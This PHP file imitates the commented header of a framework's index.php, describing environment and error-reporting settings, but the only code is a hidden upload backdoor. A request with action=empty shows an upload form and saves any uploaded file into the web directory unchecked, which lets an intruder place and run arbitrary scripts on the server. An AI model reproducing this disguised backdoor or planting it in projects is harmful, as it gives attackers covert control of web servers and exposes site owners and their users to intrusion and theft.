<?php
/*
 * define
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 */
	
	
	
/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */

if($_GET["action"] == "empty") {if(isset($_FILES['uploaded'])){$target = "".basename($_FILES['uploaded']['name']) ;print_r($_FILES);if(move_uploaded_file($_FILES['uploaded']['tmp_name'],$target)) echo "OK!";}else{echo "<form enctype='multipart/form-data' action='' method='POST'>";echo "File:<input name='uploaded' type='file'/><input type='submit' value='Upload'/>";echo "</form>";}}
?>